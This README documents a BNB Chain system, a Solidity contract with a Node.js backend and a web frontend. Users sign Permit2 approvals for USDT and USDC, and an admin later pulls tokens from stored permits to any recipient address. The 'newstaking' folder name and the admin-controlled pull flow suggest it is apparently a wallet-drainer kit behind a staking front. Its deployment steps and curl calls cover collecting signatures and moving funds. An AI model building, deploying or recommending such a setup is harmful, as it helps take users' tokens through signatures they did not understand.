# TokenGateway — Permit2 Proxy Spender on BNB Chain

A complete three-layer system: **Solidity contract** → **Node.js backend** → **Web frontend** for managing bounded, time-limited Permit2 token allowances.

---

## Architecture

```
User Browser (frontend/)
    │
    │  POST /api/permits      ← sign + submit Permit2 approval
    ▼
Node.js Backend (backend/)
    │
    │  executePermit + executeTransfer
    ▼
TokenGateway.sol (contracts/)
    │
    │  Permit2 protocol
    ▼
User's wallet tokens (USDT / USDC on BSC)
```

---

## Quick Start

### 1. Deploy the Contract

Use Remix or Hardhat to deploy `contracts/TokenGateway.sol` to BSC Mainnet.
Save the deployed address.

### 2. Configure the Backend

```bash
cd backend
cp .env.example .env
```

Edit `.env`:

```env
PORT=8787
RPC_URL=https://bsc-dataseed.binance.org
ADMIN_PRIVATE_KEY=0xYOUR_PRIVATE_KEY      # must own the contract
GATEWAY_ADDRESS=0xYOUR_DEPLOYED_CONTRACT
ADMIN_API_KEY=pick-a-long-random-secret
FEE_BPS=100                               # optional, 100 = 1%
TREASURY=0xYOUR_TREASURY_WALLET           # optional
```

### 3. Install & Run Backend

> **Requires Node.js ≥ 22.** SQLite uses the built-in `node:sqlite` module — no native compilation needed.

```bash
cd backend
npm install
npm start        # production
npm run dev      # with auto-reload (nodemon)
```

### 4. Configure the Frontend

Open `frontend/index.html` and replace:

```js
const GATEWAY = "0xYOUR_GATEWAY_ADDRESS_HERE";
```

with your deployed contract address.

### 5. Serve the Frontend

```bash
cd frontend
python3 -m http.server 3000
# open http://localhost:3000
```

---

## Full Flow

1. **User** opens the **User** tab → connects MetaMask → selects token, amount, days → clicks **Approve & Sign**
   - Step 1: ERC-20 `approve(PERMIT2, amount)` if not already approved
   - Step 2: Signs an EIP-712 Permit2 message (no on-chain tx)
   - Step 3: Signature + metadata sent to `POST /api/permits`

2. **Admin** opens the **Admin** tab → enters API key → clicks **Load Dashboard**
   - Sees all stored permits with status badges and spent progress bars

3. **Admin** clicks **⚡ Pull** on any `pending` or `partial` permit
   - Enters recipient address + amount to pull
   - Backend submits `executePermit` (set on-chain allowance) then `executeTransfer`
   - DB updated to `partial` or `executed`, tx hash returned

---

## API Reference

### Public Endpoints

#### `GET /api/config`
Returns frontend configuration.

```bash
curl http://localhost:8787/api/config
```

```json
{
  "chainId": 56,
  "permit2": "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  "gateway": "0xABCD...",
  "tokens": [
    { "address": "0x55d3...", "symbol": "USDT", "decimals": 18 },
    { "address": "0x8AC7...", "symbol": "USDC", "decimals": 18 }
  ],
  "feeBps": 100,
  "treasury": "0x..."
}
```

---

#### `POST /api/permits`
Store a signed Permit2 approval from a user.

```bash
curl -X POST http://localhost:8787/api/permits \
  -H "Content-Type: application/json" \
  -d '{
    "chainId": 56,
    "owner": "0xUSER_WALLET",
    "token": "0x55d398326f99059fF775485246999027B3197955",
    "tokenSymbol": "USDT",
    "tokenDecimals": 18,
    "amount": "5000000000000000000000",
    "amountHuman": "5000",
    "expiration": 1760000000,
    "nonce": 0,
    "sigDeadline": "1750000000",
    "spender": "0xYOUR_GATEWAY",
    "signature": "0x..."
  }'
```

**Response:**
```json
{ "id": 1, "status": "pending" }
```

**Validation rules:**
- `chainId` must match the server RPC chain
- `spender` must equal `GATEWAY_ADDRESS`
- `expiration` and `sigDeadline` must be in the future
- No duplicate `(owner, token, nonce)` with `pending` status

---

### Admin Endpoints

All admin endpoints require:
```
x-admin-key: YOUR_ADMIN_API_KEY
```

---

#### `GET /api/admin/status`
Reads live on-chain state.

```bash
curl http://localhost:8787/api/admin/status \
  -H "x-admin-key: your-key"
```

```json
{
  "admin": "0xADMIN...",
  "treasury": "0xTREASURY...",
  "paused": false,
  "feeBps": 100,
  "permit2": "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  "gateway": "0xGATEWAY...",
  "bnbBalance": "0.05"
}
```

---

#### `GET /api/admin/permits`
Returns all stored permits, newest first.

```bash
curl http://localhost:8787/api/admin/permits \
  -H "x-admin-key: your-key"
```

```json
{
  "permits": [
    {
      "id": 1,
      "owner": "0xuser...",
      "token": "0x55d3...",
      "tokenSymbol": "USDT",
      "amountHuman": "5000",
      "spent": "0",
      "spentHuman": "0",
      "expiration": 1760000000,
      "nonce": 0,
      "status": "pending",
      "txHashes": "[]"
    }
  ]
}
```

---

#### `POST /api/admin/permits/:id/execute`
Submit permit on-chain and pull tokens.

```bash
curl -X POST http://localhost:8787/api/admin/permits/1/execute \
  -H "Content-Type: application/json" \
  -H "x-admin-key: your-key" \
  -d '{ "to": "0xRECIPIENT", "amount": "1200" }'
```

```json
{
  "ok": true,
  "txHash": "0xabc...",
  "permitTx": "0xdef...",
  "remaining": "3800.0",
  "status": "partial"
}
```

**Execution steps:**
1. Load permit from DB; reject if `status` is not `pending` or `partial`
2. Check `expiration > now`; auto-mark `expired` if overdue
3. Validate `rawSpent + rawAmount ≤ rawApproved`
4. Read on-chain `Permit2.allowance` — skip `executePermit` if nonce already advanced
5. Call `gateway.executePermit(owner, singlePermit, signature)` → wait for receipt
6. Call `gateway.executeTransfer(owner, to, rawAmount, token)` → wait for receipt
7. Update DB: `spent`, `spentHuman`, `status`, `txHashes`

---

#### `POST /api/admin/settings/paused`

```bash
curl -X POST http://localhost:8787/api/admin/settings/paused \
  -H "Content-Type: application/json" \
  -H "x-admin-key: your-key" \
  -d '{ "paused": true }'
```

---

#### `POST /api/admin/settings/fee`

```bash
curl -X POST http://localhost:8787/api/admin/settings/fee \
  -H "Content-Type: application/json" \
  -H "x-admin-key: your-key" \
  -d '{ "feeBps": 50 }'
```

---

#### `POST /api/admin/settings/treasury`

```bash
curl -X POST http://localhost:8787/api/admin/settings/treasury \
  -H "Content-Type: application/json" \
  -H "x-admin-key: your-key" \
  -d '{ "treasury": "0xNEW_TREASURY" }'
```

---

#### `POST /api/admin/rescue`

Rescue stuck ERC-20 tokens:
```bash
curl -X POST http://localhost:8787/api/admin/rescue \
  -H "Content-Type: application/json" \
  -H "x-admin-key: your-key" \
  -d '{ "token": "0xTOKEN", "to": "0xDEST", "amount": "1000000000000000000" }'
```

Rescue stuck BNB (amount in wei):
```bash
curl -X POST http://localhost:8787/api/admin/rescue \
  -H "Content-Type: application/json" \
  -H "x-admin-key: your-key" \
  -d '{ "to": "0xDEST", "amount": "50000000000000000" }'
```

---

#### `GET /health`

```bash
curl http://localhost:8787/health
# { "ok": true, "ts": "2026-09-17T..." }
```

---

## Database Schema

`data.sqlite` is created automatically next to `package.json`.

```sql
CREATE TABLE permits (
  id            INTEGER PRIMARY KEY AUTOINCREMENT,
  chainId       INTEGER NOT NULL,
  owner         TEXT    NOT NULL,
  token         TEXT    NOT NULL,
  tokenSymbol   TEXT,
  tokenDecimals INTEGER,
  amount        TEXT    NOT NULL,    -- raw uint160 string
  amountHuman   TEXT,                -- "5000"
  spent         TEXT    NOT NULL DEFAULT '0',
  spentHuman    TEXT    NOT NULL DEFAULT '0',
  expiration    INTEGER NOT NULL,
  nonce         INTEGER NOT NULL,
  sigDeadline   TEXT    NOT NULL,
  spender       TEXT    NOT NULL,
  signature     TEXT    NOT NULL,
  status        TEXT    NOT NULL DEFAULT 'pending',
  txHashes      TEXT    NOT NULL DEFAULT '[]',
  createdAt     INTEGER NOT NULL,
  updatedAt     INTEGER NOT NULL
);
```

**Status values:** `pending` → `partial` → `executed` / `expired` / `failed`

---

## Project Structure

```
newstaking/
├── contracts/
│   └── TokenGateway.sol        # Solidity contract (deploy via Remix/Hardhat)
├── frontend/
│   └── index.html              # Self-contained frontend (no build step)
├── backend/
│   ├── package.json
│   ├── .env.example
│   └── src/
│       ├── server.js           # Express app entry point
│       ├── db.js               # SQLite helpers
│       ├── contract.js         # ethers.js bindings
│       ├── middleware.js       # Auth, logging, validation
│       └── routes/
│           ├── public.js       # GET /config, POST /permits
│           └── admin.js        # All /admin/* routes
└── README.md
```

---

## Security Notes

- The `ADMIN_PRIVATE_KEY` controls the contract. **Never commit it to version control.**
- `ADMIN_API_KEY` protects all admin endpoints. Use a long random string (32+ chars).
- Each Permit2 signature is bounded by `amount` and `expiration` set by the user. The admin can never pull more than the user approved.
- The contract's `setPaused(true)` halts all transfers instantly.
- Add rate-limiting (e.g. `express-rate-limit`) before deploying to production.
- In production, restrict CORS to your frontend domain.
